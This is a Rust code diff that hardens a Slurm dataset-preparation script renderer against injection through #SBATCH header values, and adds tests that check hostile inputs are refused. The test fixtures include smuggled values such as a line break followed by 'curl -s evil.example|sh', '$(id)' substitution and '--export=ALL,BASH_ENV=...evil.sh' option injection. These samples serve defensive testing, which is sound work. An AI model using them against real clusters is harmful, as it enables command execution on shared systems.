@@ -20,9 +20,8 @@ use std::path::{Path, PathBuf};
 use std::time::Duration;
 
 use serde::{Deserialize, Serialize};
-use sha1::{Digest, Sha1};
 
-use crate::hpc::{coperceive_argv, is_under, normalise_path, ServerProfile};
+use crate::hpc::{coperceive_argv, is_under, normalise_path, validate_results_root, ServerProfile};
 use crate::job_submit::{job_scratch_dir, parse_job_id, safe_job_name};
 use crate::slurm_adapter::{RemoteRunner, SshRunner};
 use crate::ssh::shell_quote;
@@ -199,17 +198,6 @@ pub fn estimate_seconds(
     (total.round() as u64, note)
 }
 
-pub fn cache_slug(adapter: &str, raw_root: &str, split: Option<&str>) -> String {
-    let mut hasher = Sha1::new();
-    hasher.update(raw_root.as_bytes());
-    let digest = hasher.finalize();
-    let short: String = digest.iter().take(6).map(|byte| format!("{byte:02x}")).collect();
-    format!(
-        "coperceive-cache/{adapter}/{short}/{}",
-        split.unwrap_or("all")
-    )
-}
-
 fn preview_hash(script: &str) -> String {
     let mut hasher = std::collections::hash_map::DefaultHasher::new();
     script.hash(&mut hasher);
@@ -247,6 +235,31 @@ fn actor_argv(profile: &ServerProfile, request: &DatasetPrepareRequest, cache: &
         "--scenes".to_string(),
     ]);
     coperceive_argv(profile, &args)
+}
+
+/// A value written unquoted into an `#SBATCH` line (and the header comment)
+/// must reach sbatch as one argument. After a line break bash would run the rest
+/// as a command and sbatch would stop reading directives; sbatch also splits a
+/// directive line at whitespace, ends it at an unquoted '#', and groups quotes,
+/// so a space could add an option such as `--export=ALL,BASH_ENV=<file>`.
+fn sbatch_value(label: &str, value: &str) -> Result<(), String> {
+    if value.chars().any(char::is_control) {
+        return Err(format!(
+            "The {label} {value:?} contains a line break or control character, so it cannot go \
+             into the job script."
+        ));
+    }
+    if value
+        .chars()
+        .any(|ch| ch.is_whitespace() || matches!(ch, '#' | '\'' | '"'))
+    {
+        return Err(format!(
+            "The {label} {value:?} cannot go into the job script's #SBATCH line: Slurm splits \
+             these lines at spaces and cuts them at '#', so the value may not contain spaces, \
+             '#' or quotes."
+        ));
+    }
+    Ok(())
 }
 
 /// Render the full prepare script; `scene_ids` are the selected scenes (every
@@ -304,7 +317,10 @@ pub fn render_prepare_script_with_estimate(
         .map(str::trim)
         .filter(|value| !value.is_empty())
         .ok_or_else(|| "Choose a partition on the server profile before preparing a dataset.".to_string())?;
-    let results_root = normalise_path(&profile.results_root, "results_root")?;
+    // The results folder is written unquoted into the #SBATCH --output/--error
+    // lines; the profile was validated when it was saved, but check again here
+    // (this refuses a line break, and a space, '#' or quote sbatch would split).
+    let results_root = validate_results_root(&profile.results_root)?;
     let cache = normalise_path(
         &format!("{}/{}", results_root.trim_end_matches('/'), cache_relative),
         "cache root",
@@ -319,10 +335,10 @@ pub fn render_prepare_script_with_estimate(
         .clone()
         .filter(|value| !value.trim().is_empty())
         .unwrap_or_else(|| DEFAULT_WALLTIME.to_string());
-    let job_name = format!(
-        "coperceive-dataset-{}",
-        cache_relative.rsplit('/').next().unwrap_or("prepare")
-    );
+    let job_name = prepare_job_name(cache_relative);
+    sbatch_value("job name", &job_name)?;
+    sbatch_value("partition", partition)?;
+    sbatch_value("walltime", &walltime)?;
     let mut lines = vec![
         "#!/bin/bash".to_string(),
         format!("# Dataset preparation for {}.", request.adapter),
@@ -465,18 +481,52 @@ pub fn submit_prepared(
     }))
 }
 
-pub fn cache_absolute(
+/// The prepare job's Slurm name: `coperceive-dataset-<hash>-<split>` from the
+/// cache path, so two datasets with a `test` split never share a name (the job
+/// watch checks a job by its name and user).
+pub fn prepare_job_name(cache_relative: &str) -> String {
+    let mut parts = cache_relative.trim_end_matches('/').rsplit('/');
+    let split = parts.next().filter(|part| !part.is_empty()).unwrap_or("all");
+    match parts.next().filter(|part| !part.is_empty()) {
+        Some(hash) => format!("coperceive-dataset-{hash}-{split}"),
+        None => format!("coperceive-dataset-{split}"),
+    }
+}
+
+/// `<results_root>/<cache.relative_path>`: the cache split directory the
+/// dataset index named. The app never builds the path itself. Only the
+/// server's coperceive knows the raw root's real path, which the hash is
+/// taken from. The path must be `coperceive-cache/<adapter>/<12 hex>/<split>`
+/// for this adapter and split (`all` without one).
+pub fn cache_dir(
     profile: &ServerProfile,
     adapter: &str,
-    raw_root: &str,
     split: Option<&str>,
+    cache_relative: &str,
 ) -> Result<String, String> {
+    let split = split.map(str::trim).filter(|split| !split.is_empty()).unwrap_or("all");
+    if !matches!(adapter, "griffin" | "opv2v" | "v2xset" | "v2v4real" | "dair-v2x-c") {
+        return Err(format!("{adapter} is not a built-in cluster adapter."));
+    }
+    if !split.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-') {
+        return Err("The dataset split must be a plain name.".to_string());
+    }
+    let parts: Vec<&str> = cache_relative.split('/').collect();
+    let valid = matches!(
+        parts.as_slice(),
+        ["coperceive-cache", a, hash, s]
+            if *a == adapter
+                && *s == split
+                && hash.len() == 12
+                && hash.chars().all(|c| c.is_ascii_digit() || ('a'..='f').contains(&c))
+    );
+    if !valid {
+        return Err(
+            "The dataset index named an unexpected cache path. Index the dataset again.".to_string(),
+        );
+    }
     let results = normalise_path(&profile.results_root, "results_root")?;
-    Ok(format!(
-        "{}/{}",
-        results.trim_end_matches('/'),
-        cache_slug(adapter, raw_root, split)
-    ))
+    Ok(format!("{}/{}", results.trim_end_matches('/'), cache_relative))
 }
 
 #[cfg(test)]
@@ -505,6 +555,64 @@ mod tests {
 
     fn scenes(ids: &[&str]) -> Vec<String> {
         ids.iter().map(|id| id.to_string()).collect()
+    }
+
+    #[test]
+    fn the_prepare_job_name_is_unique_per_dataset_split() {
+        let entry = entry();
+        let one = render_prepare_script(
+            &entry.profile,
+            &request(),
+            &scenes(&["scene_0001"]),
+            "coperceive-cache/opv2v/3b1e2f0a9c77/test",
+            1,
+            2,
+        )
+        .expect("preview");
+        assert_eq!(one.job_name, "coperceive-dataset-3b1e2f0a9c77-test");
+        assert!(one.script.contains("\n#SBATCH --job-name=coperceive-dataset-3b1e2f0a9c77-test\n"));
+        // Another raw root with a `test` split gets another name (it used to be
+        // `coperceive-dataset-test` for both).
+        let other = render_prepare_script(
+            &entry.profile,
+            &request(),
+            &scenes(&["scene_0001"]),
+            "coperceive-cache/opv2v/0f0f0f0f0f0f/test",
+            1,
+            2,
+        )
+        .expect("preview");
+        assert_ne!(one.job_name, other.job_name);
+        assert_eq!(prepare_job_name("coperceive-cache/griffin/aaaaaaaaaaaa/all"), "coperceive-dataset-aaaaaaaaaaaa-all");
+        assert_eq!(prepare_job_name("test"), "coperceive-dataset-test");
+    }
+
+    #[test]
+    fn the_cache_dir_is_the_index_path_under_the_results_root() {
+        let profile = entry().profile;
+        let dir = cache_dir(&profile, "opv2v", Some("test"), "coperceive-cache/opv2v/3b1e2f0a9c77/test")
+            .expect("cache dir");
+        assert_eq!(dir, "/data/results/coperceive-cache/opv2v/3b1e2f0a9c77/test");
+        assert_eq!(
+            cache_dir(&profile, "griffin", None, "coperceive-cache/griffin/3b1e2f0a9c77/all").expect("no split"),
+            "/data/results/coperceive-cache/griffin/3b1e2f0a9c77/all"
+        );
+        for bad in [
+            "coperceive-cache/opv2v/3b1e2f0a9c77/train",
+            "coperceive-cache/v2xset/3b1e2f0a9c77/test",
+            "coperceive-cache/opv2v/3B1E2F0A9C77/test",
+            "coperceive-cache/opv2v/abc123/test",
+            "coperceive-cache/opv2v/../../../etc",
+            "coperceive-cache/opv2v/3b1e2f0a9c77/test/..",
+            "/abs/coperceive-cache/opv2v/3b1e2f0a9c77/test",
+            "other/opv2v/3b1e2f0a9c77/test",
+            "",
+        ] {
+            assert!(cache_dir(&profile, "opv2v", Some("test"), bad).is_err(), "{bad}");
+        }
+        // The adapter and split must be plain too, even when the path matches them.
+        assert!(cache_dir(&profile, "..", Some("test"), "coperceive-cache/../3b1e2f0a9c77/test").is_err());
+        assert!(cache_dir(&profile, "opv2v", Some(".."), "coperceive-cache/opv2v/3b1e2f0a9c77/..").is_err());
     }
 
     #[test]
@@ -677,6 +785,298 @@ mod tests {
         assert_eq!(preview_bytes_estimate(&index, None), 15 * PREVIEW_BYTES_ESTIMATE);
         let only_b = ["b".to_string()];
         assert_eq!(preview_bytes_estimate(&index, Some(&only_b)), 5 * PREVIEW_BYTES_ESTIMATE);
+    }
+
+    #[test]
+    fn a_results_root_that_would_break_out_of_an_sbatch_line_is_refused() {
+        for bad in [
+            "/dev/null\necho INJECTED_LINE_RAN #",
+            "/shared/lab/runs\ncurl -s evil.example|sh\n#",
+            "/data/results\rx",
+            "/data/lab/x$(id)",
+            "/data/lab/x`id`",
+            "/data/lab/x\"y",
+            "/data/lab/x\\y",
+        ] {
+            let mut entry = entry();
+            entry.profile.results_root = bad.to_string();
+            let error = render_prepare_script(
+                &entry.profile,
+                &request(),
+                &scenes(&["scene_0001"]),
+                "coperceive-cache/opv2v/abc123/test",
+                0,
+                0,
+            )
+            .expect_err(&format!("results_root {bad:?} must be refused"));
+            assert!(error.contains("results folder"), "{bad:?}: {error}");
+        }
+    }
+
+    #[test]
+    fn a_tilde_results_root_is_refused_instead_of_writing_into_a_literal_tilde_folder() {
+        let mut entry = entry();
+        entry.profile.results_root = "~/results".to_string();
+        let error = render_prepare_script(
+            &entry.profile,
+            &request(),
+            &scenes(&["scene_0001"]),
+            "coperceive-cache/opv2v/abc123/test",
+            0,
+            0,
+        )
+        .expect_err("~ results root");
+        assert!(error.contains("absolute path"), "{error}");
+    }
+
+    #[test]
+    fn sbatch_header_values_stay_on_their_line() {
+        // The job name comes from the cache path the cluster's index returned.
+        let entry = entry();
+        let error = render_prepare_script(
+            &entry.profile,
+            &request(),
+            &scenes(&["scene_0001"]),
+            "coperceive-cache/opv2v/abc123/test\necho INJECTED_LINE_RAN",
+            0,
+            0,
+        )
+        .expect_err("line break in the job name");
+        assert!(error.contains("line break"), "{error}");
+
+        for (partition, time_limit) in [
+            (Some("main-cpu\necho INJECTED_LINE_RAN"), None),
+            (None, Some("04:00:00\necho INJECTED_LINE_RAN")),
+        ] {
+            let mut entry = entry.clone();
+            if let Some(partition) = partition {
+                entry.profile.defaults.partition = Some(partition.to_string());
+            }
+            if let Some(time_limit) = time_limit {
+                entry.profile.defaults.time_limit = Some(time_limit.to_string());
+            }
+            let error = render_prepare_script(
+                &entry.profile,
+                &request(),
+                &scenes(&["scene_0001"]),
+                "coperceive-cache/opv2v/abc123/test",
+                0,
+                0,
+            )
+            .expect_err("line break in an #SBATCH value");
+            assert!(error.contains("line break"), "{error}");
+        }
+
+        // Every header line of a legitimate script is a single line.
+        let preview = render_prepare_script(
+            &entry.profile,
+            &request(),
+            &scenes(&["scene_0001"]),
+            "coperceive-cache/opv2v/abc123/test",
+            0,
+            0,
+        )
+        .expect("legitimate preview");
+        assert!(
+            preview
+                .script
+                .contains("#SBATCH --output=/data/results/dataset-prepare-%A_%a.out\n"),
+            "{}",
+            preview.script
+        );
+    }
+
+    /// Splits the text after `#SBATCH` the way sbatch's directive reader does
+    /// (Slurm src/sbatch/opt.c): whitespace separates arguments, a backslash
+    /// escapes the next character, single or double quotes group, and an
+    /// unquoted '#' ends the line. An unmatched quote is an sbatch error.
+    fn sbatch_arguments(rest: &str) -> Result<Vec<String>, String> {
+        let mut arguments = Vec::new();
+        let mut chars = rest.chars().peekable();
+        loop {
+            while chars.peek().is_some_and(|ch| ch.is_ascii_whitespace()) {
+                chars.next();
+            }
+            if chars.peek().is_none() {
+                return Ok(arguments);
+            }
+            let mut argument = String::new();
+            let mut quote: Option<char> = None;
+            let mut escaped = false;
+            let mut comment = false;
+            while let Some(&ch) = chars.peek() {
+                if quote.is_none() && !escaped && ch.is_ascii_whitespace() {
+                    break;
+                }
+                chars.next();
+                if escaped {
+                    escaped = false;
+                    argument.push(ch);
+                } else if ch == '\\' {
+                    escaped = true;
+                } else if quote == Some(ch) {
+                    quote = None;
+                } else if quote.is_none() && (ch == '"' || ch == '\'') {
+                    quote = Some(ch);
+                } else if quote.is_none() && ch == '#' {
+                    comment = true;
+                    break;
+                } else {
+                    argument.push(ch);
+                }
+            }
+            if let Some(quote) = quote {
+                return Err(format!("Unmatched `{quote}` in [{rest}]"));
+            }
+            if !argument.is_empty() {
+                arguments.push(argument);
+            }
+            if comment {
+                return Ok(arguments);
+            }
+        }
+    }
+
+    /// Every `#SBATCH` line must reach sbatch as exactly one `--option=value`.
+    fn assert_one_sbatch_argument_per_line(script: &str, case: &str) {
+        let mut seen = 0;
+        for line in script.lines() {
+            let Some(rest) = line.strip_prefix("#SBATCH") else {
+                continue;
+            };
+            seen += 1;
+            let arguments = sbatch_arguments(rest)
+                .unwrap_or_else(|error| panic!("{case}: sbatch would refuse {line:?}: {error}"));
+            assert_eq!(arguments.len(), 1, "{case}: {line:?} gives sbatch {arguments:?}");
+            assert!(arguments[0].starts_with("--"), "{case}: {line:?} gives {arguments:?}");
+            assert_eq!(
+                format!("#SBATCH {}", arguments[0]),
+                line,
+                "{case}: sbatch reads {line:?} as {arguments:?}"
+            );
+        }
+        assert!(seen >= 7, "{case}: expected the #SBATCH header: {script}");
+    }
+
+    #[test]
+    fn the_sbatch_tokenizer_port_splits_like_sbatch() {
+        assert_eq!(
+            sbatch_arguments(" --output=/dev/null --export=ALL,BASH_ENV=/x #/a.out").unwrap(),
+            vec!["--output=/dev/null", "--export=ALL,BASH_ENV=/x"]
+        );
+        assert_eq!(sbatch_arguments(" --output=/data/My Lab/x").unwrap().len(), 2);
+        assert!(sbatch_arguments(" --output=/data/o'brien/x").is_err());
+        assert_eq!(
+            sbatch_arguments(" --output=/data/results/x-%A_%a.out").unwrap(),
+            vec!["--output=/data/results/x-%A_%a.out"]
+        );
+    }
+
+    #[test]
+    fn every_rendered_sbatch_line_is_exactly_one_sbatch_argument() {
+        // (results_root, cache_relative, partition, time_limit). Each either
+        // renders a header sbatch reads as one argument per line, or is refused.
+        let cache = "coperceive-cache/opv2v/abc123/test";
+        let cases: &[(&str, &str, Option<&str>, Option<&str>)] = &[
+            ("/dev/null --export=ALL,BASH_ENV=/data/lab/evil.sh #", cache, None, None),
+            ("/data/lab/r --output=/dev/null --export=ALL,BASH_ENV=/x #", cache, None, None),
+            ("/data/lab/r --chdir=/data/lab/evil --comment=x", cache, None, None),
+            ("/data/My Lab/runs", cache, None, None),
+            ("/data/o'brien/runs", cache, None, None),
+            ("/data/lab#2/runs", cache, None, None),
+            ("/data/results", "coperceive-cache/opv2v/abc123/test --export=ALL #", None, None),
+            ("/data/results", "coperceive-cache/opv2v/abc123/it's", None, None),
+            ("/data/results", cache, Some("main-cpu --export=ALL,BASH_ENV=/x"), None),
+            ("/data/results", cache, Some("main#cpu"), None),
+            ("/data/results", cache, None, Some("04:00:00 --chdir=/tmp")),
+            ("/data/results", cache, None, Some("'04:00:00")),
+        ];
+        let mut refused = 0;
+        for (results_root, cache_relative, partition, time_limit) in cases {
+            let mut entry = entry();
+            entry.profile.results_root = results_root.to_string();
+            if let Some(partition) = partition {
+                entry.profile.defaults.partition = Some(partition.to_string());
+            }
+            if let Some(time_limit) = time_limit {
+                entry.profile.defaults.time_limit = Some(time_limit.to_string());
+            }
+            let case = format!("{results_root:?} {cache_relative:?} {partition:?} {time_limit:?}");
+            match render_prepare_script(
+                &entry.profile,
+                &request(),
+                &scenes(&["scene_0001", "scene_0002"]),
+                cache_relative,
+                0,
+                0,
+            ) {
+                Ok(preview) => assert_one_sbatch_argument_per_line(&preview.script, &case),
+                Err(error) => {
+                    refused += 1;
+                    assert!(
+                        error.contains("spaces, '#' or quotes"),
+                        "{case}: refused for another reason: {error}"
+                    );
+                }
+            }
+        }
+        assert_eq!(refused, cases.len(), "every hostile value must be refused");
+
+        // Legitimate values render, and sbatch reads each line as one argument.
+        for (results_root, partition, time_limit) in [
+            ("/data/results", "main-cpu", "04:00:00"),
+            ("/data/results/", "gpu_a100,cpu", "1-00:00:00"),
+            ("/gpfs/lab-01/user_x/runs.v2", "main-cpu", "30"),
+            ("/data/results:2024+%,=@", "main-cpu", "04:00:00"),
+        ] {
+            let mut entry = entry();
+            entry.profile.results_root = results_root.to_string();
+            entry.profile.defaults.partition = Some(partition.to_string());
+            entry.profile.defaults.time_limit = Some(time_limit.to_string());
+            let preview = render_prepare_script(
+                &entry.profile,
+                &request(),
+                &scenes(&["scene_0001"]),
+                cache,
+                0,
+                0,
+            )
+            .unwrap_or_else(|error| panic!("{results_root:?}: {error}"));
+            assert_one_sbatch_argument_per_line(&preview.script, results_root);
+        }
+    }
+
+    #[test]
+    fn the_job_name_guard_itself_refuses_what_sbatch_would_split() {
+        // The cache path the cluster returned is not a results folder, so only
+        // the #SBATCH value guard stands between it and the --job-name line:
+        // normalise_path accepts spaces, '#' and quotes.
+        for cache_relative in [
+            // The job name is the last path segment, so no '/' after the space.
+            "coperceive-cache/opv2v/abc123/test --export=ALL,BASH_ENV=evil.sh",
+            "coperceive-cache/opv2v/abc123/te#st",
+            "coperceive-cache/opv2v/abc123/it's",
+        ] {
+            let joined = format!("/data/results/{cache_relative}");
+            normalise_path(&joined, "cache root").expect("normalise_path accepts it");
+            let error = render_prepare_script(
+                &entry().profile,
+                &request(),
+                &scenes(&["scene_0001"]),
+                cache_relative,
+                0,
+                0,
+            )
+            .expect_err(cache_relative);
+            assert!(error.contains("job name"), "{cache_relative:?}: {error}");
+            assert!(error.contains("spaces, '#' or quotes"), "{cache_relative:?}: {error}");
+        }
+        // The same guard also refuses a line break directly (in the renderer a
+        // line break in the cache path is already refused by normalise_path).
+        let error = sbatch_value("job name", "coperceive-dataset-test\necho INJECTED_LINE_RAN")
+            .expect_err("line break");
+        assert!(error.contains("line break"), "{error}");
+        sbatch_value("job name", "coperceive-dataset-test").expect("plain job name");
     }
 
     #[test]
